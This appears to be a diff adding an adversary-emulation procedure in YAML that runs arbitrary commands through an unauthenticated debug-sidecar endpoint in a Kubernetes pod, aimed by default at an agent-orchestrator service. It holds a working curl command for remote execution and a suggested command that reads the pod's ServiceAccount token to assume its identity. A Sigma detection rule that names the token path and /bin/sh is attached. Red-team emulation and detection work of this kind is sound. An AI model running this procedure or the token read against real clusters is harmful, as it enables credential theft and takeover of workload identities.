@@ -1,0 +1,68 @@
+name: Execute Command via Debug Sidecar
+description: >
+  A debug/telemetry sidecar in the target pod exposes an unauthenticated command
+  endpoint (/api/run) and shares the pod's ServiceAccount token and network
+  identity. It is a generic command channel: whatever runs here executes with
+  the workload's identity, however hardened the main container is. Run anything -
+  e.g. read the SA token to assume the identity
+  (CMD: cat /var/run/secrets/kubernetes.io/serviceaccount/token).
+tactic: Execution
+techniques: ["Command and Scripting Interpreter", "T1059"]
+parameters:
+  TARGET:
+    type: string
+    default: "agent-orchestrator.agent-system.svc"
+    description: >
+      Debug sidecar address. Defaults to the in-cluster Service DNS name (with
+      PORT 8099). From the operator host reach it instead via a node IP with
+      PORT set to the NodePort (30099).
+  PORT:
+    type: int
+    default: 8099
+    description: the sidecar's /api/run port (8099 for the Service, 30099 for the NodePort)
+  CMD:
+    type: string
+    default: "id"
+    description: >
+      the command to run inside the sidecar via /api/run. Defaults to a benign
+      identity check; set it to read the ServiceAccount token, or anything else.
+procedures:
+  - key: curl
+    command: |
+      curl -sS --max-time 15 http://${TARGET}:${PORT}/api/run \
+        -H 'Content-Type: application/json' \
+        -d "{\"cmd\":\"${CMD}\"}" \
+        | jq -r '.output'
+    isLocal: true
+preconditions:
+  kind: C2
+effects:
+  - commandExecuted
+defense:
+  id: D3-PM
+  name: Platform Monitoring
+  url: https://d3fend.mitre.org/technique/d3f:PlatformMonitoring/
+  sigma:
+    title: Unexpected process executed inside a sidecar container
+    status: experimental
+    description: >
+      A debug/telemetry sidecar with a command endpoint runs an unexpected
+      process. Because sidecars share the pod's ServiceAccount token and
+      network namespace, code execution here is code execution as the workload.
+      Caught at runtime (eBPF - Kubescape/Falco), not in the Kubernetes audit
+      log: these commands never reach the API server.
+    logsource:
+      category: process_creation
+      product: linux
+    detection:
+      selection:
+        # a shell or credential read spawned inside the sidecar container
+        CommandLine|contains:
+          - '/var/run/secrets/kubernetes.io/serviceaccount/token'
+          - '/bin/sh'
+      condition: selection
+    falsepositives:
+      - Legitimate use of the sidecar's own tooling
+    level: medium
+references:
+  - https://kubernetes.io/docs/concepts/workloads/pods/#how-pods-manage-multiple-containers
